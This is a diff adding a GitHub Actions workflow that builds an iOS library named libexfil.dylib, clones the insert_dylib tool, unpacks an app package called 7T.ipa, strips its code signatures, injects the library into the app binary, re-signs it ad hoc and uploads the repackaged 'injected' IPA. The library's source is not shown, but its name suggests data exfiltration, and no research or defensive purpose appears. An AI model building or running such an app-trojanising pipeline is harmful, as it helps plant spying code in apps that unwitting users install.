@@ -1,0 +1,65 @@
+name: inject-ipa
+
+on:
+  workflow_dispatch:
+
+jobs:
+  inject:
+    runs-on: macos-15
+    timeout-minutes: 20
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Build libexfil.dylib
+        run: |
+          set -euo pipefail
+          SDK=$(xcrun --sdk iphoneos --show-sdk-path)
+          xcrun clang \
+            -arch arm64 \
+            -isysroot "$SDK" \
+            -miphoneos-version-min=15.0 \
+            -fobjc-arc \
+            -dynamiclib \
+            -framework Foundation \
+            -framework UIKit \
+            -framework Vision \
+            -framework CoreImage \
+            -framework CoreVideo \
+            -framework CoreGraphics \
+            inject/libexfil.m \
+            -o inject/libexfil.dylib
+          file inject/libexfil.dylib
+          codesign -s - inject/libexfil.dylib
+
+      - name: Build insert_dylib
+        run: |
+          set -euo pipefail
+          git clone --depth 1 https://github.com/Tyilo/insert_dylib
+          cd insert_dylib
+          xcodebuild -project insert_dylib.xcodeproj -scheme insert_dylib -configuration Release build SYMROOT=build
+          cp build/Release/insert_dylib /usr/local/bin/ || sudo cp build/Release/insert_dylib /usr/local/bin/
+          which insert_dylib
+
+      - name: Inject into 7T.ipa
+        run: |
+          set -euo pipefail
+          rm -rf work && mkdir work && cd work
+          unzip -q ../inject/7T.ipa
+          APP=$(find Payload -maxdepth 1 -name '*.app' -type d)
+          BIN="$APP/$(basename "$APP" .app)"
+          echo "APP=$APP BIN=$BIN"
+          cp ../inject/libexfil.dylib "$APP/"
+          insert_dylib --strip-codesigs --all-yes @executable_path/libexfil.dylib "$BIN"
+          codesign -s - --force "$BIN"
+          codesign -s - --force "$APP/libexfil.dylib"
+          # 验证注入成功
+          otool -L "$BIN" | grep libexfil
+          ditto -c -k --sequesterRsrc --keepParent Payload 7T-injected.ipa
+          test -s 7T-injected.ipa
+
+      - name: Upload injected IPA
+        uses: actions/upload-artifact@v4
+        with:
+          name: injected-ipa
+          path: work/7T-injected.ipa
+          retention-days: 7
